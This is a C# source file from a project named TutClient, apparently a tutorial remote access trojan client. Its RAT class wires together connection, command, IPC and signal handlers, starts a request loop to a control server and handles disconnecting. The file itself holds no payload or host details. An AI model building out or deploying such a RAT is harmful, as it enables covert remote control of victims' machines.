using System.Net;

using TutClient.Enum;
using TutClient.Handlers;

namespace TutClient
{
    public class RAT
    {
        private readonly IConnectionHandler _connectionHandler;
        private readonly ICommandHandler _commandHandler;
        private readonly IIpcClientHandler _ipcClientHandler;
        private readonly ISignalHandler _signalHandler;

        private OnEventHandler _handler;

        public RAT(
            IConnectionHandler connectionHandler,
            ICommandHandler commandHandler, 
            IIpcClientHandler ipcClientHandler,
            ISignalHandler signalHandler)
        {
            _connectionHandler = connectionHandler;
            _commandHandler = commandHandler;
            _ipcClientHandler = ipcClientHandler;
            _signalHandler = signalHandler;
        }

        private void StartRAT()
        {
            _handler += _signalHandler.Handler;
            Program.SetConsoleCtrlHandler(_handler, true);
            ServicePointManager.UseNagleAlgorithm = false;
            
            _connectionHandler.RequestLoop();
        }

        public void StopRAT()
        {
            _connectionHandler.DisconnectFromServer();
            _ipcClientHandler.StopIpcHandler();
            _commandHandler.SendCommand("dclient");
        }
    }
}
